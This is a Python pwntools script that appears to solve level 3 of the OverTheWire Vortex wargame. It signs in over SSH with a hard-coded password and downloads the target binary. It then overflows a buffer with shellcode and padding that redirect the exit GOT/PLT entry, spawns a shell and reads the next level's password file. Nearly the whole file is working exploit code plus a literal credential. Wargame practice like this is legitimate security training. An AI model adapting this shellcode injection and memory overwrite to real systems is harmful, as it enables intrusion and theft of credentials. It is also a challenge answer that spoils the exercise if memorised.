from pwn import *

host = "vortex.labs.overthewire.org"
user = "vortex3"
password = "64ncXTvx#"
passfile = "/etc/vortex_pass/vortex3"
binary = "/vortex/vortex3"

shell = ssh(host=host, user=user, password=password)

if not os.path.exists("/root/Vortex/vortex3"):
	shell.download_file(binary)
	os.chmod("vortex3", 0755)

elf = ELF("vortex3")
p_exit = elf.plt['exit']+2

assert unpack(elf.read(p_exit, 4)) == elf.got["exit"]

addr_buf = -0x88
addr_tmp = -8
addr_lpp = -4
spam = ""
spam += asm(shellcraft.sh())
spam += cyclic(addr_lpp-addr_buf-len(spam))
spam += p32(p_exit)

r = shell.run("%s %s" % (binary, spam))
# r = shell.run("%s $%r" % (binary, spam))
r.clean()

r.sendline("cat /etc/vortex_pass/vortex4")
print r.recv().strip()
